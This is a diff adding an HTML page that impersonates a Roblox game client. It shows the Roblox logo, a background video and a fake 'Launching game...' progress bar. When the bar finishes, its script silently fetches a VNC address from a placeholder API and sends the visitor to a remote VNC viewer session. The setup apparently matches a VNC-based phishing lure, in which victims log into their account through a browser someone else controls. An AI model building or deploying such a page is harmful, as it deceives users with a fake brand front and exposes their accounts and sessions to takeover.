@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Client - Roblox</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: #000; /* Ensures background is black if video fails */
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1;
+        }
+
+        .content {
+            position: absolute;
+            bottom: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 2;
+            text-align: center;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .background-video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .launching-box {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            width: 400px; /* Adjusted width */
+        }
+
+        .launching-text {
+            font-size: 16px;
+            color: #fff;
+            text-shadow: 2px 2px 5px #000;
+            font-weight: bold;
+            margin-left: 10px;
+            margin-right: 10px;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+        }
+
+        .progress-bar {
+            flex: 1;
+            background: #333;
+            border-radius: 25px;
+            overflow: hidden;
+            height: 10px;
+        }
+
+        .progress {
+            height: 100%;
+            width: 0;
+            background: #ff69b4;
+            border-radius: 25px 0 0 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div>
+    <video autoplay muted loop class="background-video">
+        <source src="https://pixeldrain.com/api/file/j3HtcPcr?download" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <div class="content">
+        <div class="launching-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/48/Roblox_Logo_2021.png" alt="Roblox Logo" class="logo">
+            <div class="launching-text">Launching game...</div>
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        window.addEventListener('load', function() {
+            const progress = document.querySelector('.progress');
+            let width = 0;
+            const interval = setInterval(function() {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    // Make API request to get the VNC IP and port
+                    fetch('https://your-api-endpoint.com/get-vnc')
+                        .then(response => response.json())
+                        .then(data => {
+                            // Redirect to the VNC viewer URL with the received IP and port
+                            const vncUrl = `https://your-vnc-viewer.com?ip=${data.ip}&port=${data.port}`;
+                            window.location.href = vncUrl;
+                        })
+                        .catch(error => {
+                            console.error('Error fetching VNC details:', error);
+                            // Handle the error (e.g., display an error message)
+                        });
+                } else {
+                    width += 1;
+                    progress.style.width = width + '%';
+                }
+            }, 30); // Adjust the speed of the progress bar here
+        });
+    </script>
+</body>
+</html>
